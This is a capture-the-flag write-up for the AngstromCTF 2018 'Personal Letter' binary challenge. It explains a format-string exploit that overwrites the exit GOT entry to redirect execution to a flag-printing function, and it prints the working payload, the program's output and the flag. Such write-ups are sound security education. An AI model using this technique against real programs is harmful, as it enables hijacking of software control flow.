# AngstromCTF_2018: Personal Letter

**Category:** Binary
**Points:** 160
**Description:**

>Have you ever gotten tired of writing your name in the header of a letter? Well now there's a [program](personal_letter32) to do it for you! Navigate to /problems/letter/ on the shell server to try your exploit out!

## Write-up
This challenge was slightly tricky in that it was a ROP challenge that had to done with format strings. There will be many solutions to this challenge but essentially I chose to target the Global Offset Table (GOT). Before we can start crafting our exploit, we need to know the addresses of what we are targetting.

    printFlag:  0x804872b
    exit@GOT:   0x804a030

Knowing that, let's target the last two bytes of our exit GOT table. Next, we craft our exploit and try to execute it.

    $ python -c 'print("\x30\xa0\x04\x08" + "\x31\xa0\x04\x08" + "%27u" + "%26$hnn" + "%91u" + "%27$hhn")' | ./personal_letter32 
    Welcome to the personal letter program!
    Give us your name, and we will generate a letter just for you!
    Enter Name (100 Chars max): 
    ________________________________________
    |                                      |
    |                                      |
    |  Dear 01                 4289382168n                                                                                         28,|
    |  __________________________________  |
    |  __________________________________  |
    |  __________________________________  |
    |  __________________________________  |
    |  __________________________________  |
    |  __________________________________  |
    |  __________________________________  |
    |  __________________________________  |
    |  __________________________________  |
    |  __________________________________  |
    |  __________________________________  |
    |  __________________________________  |
    |  __________________________________  |
    |  __________________________________  |
    |  __________________________________  |
    |  __________________________________  |
    |  __________________________________  |
    |______________________________________|
    Exiting.

    Status Code: 0
    Here's a flag: actf{flags_are_fun}

Therefore, the flag is `actf{flags_are_fun}`.
